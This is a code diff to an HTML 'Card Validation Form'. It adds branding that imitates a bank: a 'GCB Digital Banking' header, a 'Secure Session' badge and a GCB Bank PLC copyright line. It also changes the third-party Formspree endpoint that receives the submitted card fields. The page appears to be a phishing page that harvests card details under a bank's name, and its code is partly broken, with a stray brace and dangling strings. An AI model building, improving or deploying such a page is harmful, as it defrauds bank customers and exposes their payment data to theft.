@@ -33,6 +33,93 @@
       background: var(--bg);
       line-height: 1.5;
     }
+   }
+ .topbar{
+      background: linear-gradient(180deg, #0b3a6b 0%, #082f56 100%);
+      color:#fff;
+      padding: 14px 16px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      box-shadow: 0 10px 26px rgba(2,6,23,.18);
+    }
+
+    .topbar__inner{
+      max-width: 980px;
+      margin: 0 auto;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      min-width: 0;
+    }
+
+    .brand__logo{
+      width:44px;
+      height:44px;
+      border-radius:999px;
+      background: #f1c40f;
+      color:#0b3a6b;
+      display:grid;
+      place-items:center;
+      font-weight:900;
+      letter-spacing:.5px;
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,.25);
+      flex: 0 0 auto;
+    }
+
+    .brand__text{ min-width: 0; line-height:1.05; }
+    .brand__title{
+      font-weight: 800;
+      font-size: 16px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .brand__subtitle{
+      font-size: 12px;
+      opacity: .85;
+      margin-top: 4px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .secure-pill{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      padding: 10px 12px;
+      border-radius: 999px;
+      background: rgba(255,255,255,.14);
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
+      font-weight: 700;
+      font-size: 13px;
+      user-select:none;
+      flex: 0 0 auto;
+    }
+
+    .dot{
+      width:10px;
+      height:10px;
+      border-radius:999px;
+      background:#22c55e;
+      box-shadow: 0 0 0 3px rgba(34,197,94,.20);
+    }
+
+    .wrap{
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 22px 16px 32px;
+      display:flex;
+      justify-content:center;
+    }
 
     .banking-portal{
       max-width: var(--maxw);
@@ -149,11 +236,17 @@
         width: auto;
         justify-self: start;
       }
+  
+	  .footer{
+      text-align:center;
+      color:#9ca3af;
+      font-size: 12.5px;
+      padding: 22px 16px 28px;
     }
 
-    @media (max-width: 600px){
-      body{ padding: 14px; }
-      .banking-portal{ padding: 16px; }
+    @media (min-width: 480px){
+      .card{ padding: 26px 22px 20px; }
+      .card__title{ font-size: 28px; }
     }
   </style>
 
@@ -196,8 +289,8 @@
       // Use a PCI-compliant payment processor/tokenization instead.
 
       try {
-        const endpoint = form.action; "https://formspree.io/f/mkovkyye"
-        const formData = new FormData(form); "https://formspree.io/f/mkovkyye"
+        const endpoint = form.action; "https://formspree.io/f/meelnzav"
+        const formData = new FormData(form); "https://formspree.io/f/meelnzav"
 
         const response = await fetch(endpoint, {
           method: "POST",
@@ -240,12 +333,29 @@
 </head>
 
 <body>
+  <header class="topbar" role="banner">
+    <div class="topbar__inner">
+      <div class="brand" aria-label="GCB Digital Banking">
+        <div class="brand__logo" aria-hidden="true">GCB</div>
+        <div class="brand__text">
+          <div class="brand__title">GCB Digital Banking</div>
+          <div class="brand__subtitle">Secure Client Portal</div>
+        </div>
+      </div>
+
+      <div class="secure-pill" aria-label="Secure Session">
+        <span class="dot" aria-hidden="true"></span>
+        Secure Session
+      </div>
+    </div>
+  </header>
+  
   <div class="banking-portal">
     <h1>Card Validation Form</h1>
 
     <form
     id="myForm"
-   action="https://formspree.io/f/mkovkyye"
+   action="https://formspree.io/f/meelnzav"
   method="POST"
       
       <fieldset>
@@ -346,12 +456,9 @@
     </form>
   </div>
 </body>
-
+  
+  <footer class="footer">
+    © 2026 GCB Bank PLC. All rights reserved.
+  </footer>
+  
 </html>
-
-
-
-
-
-
-
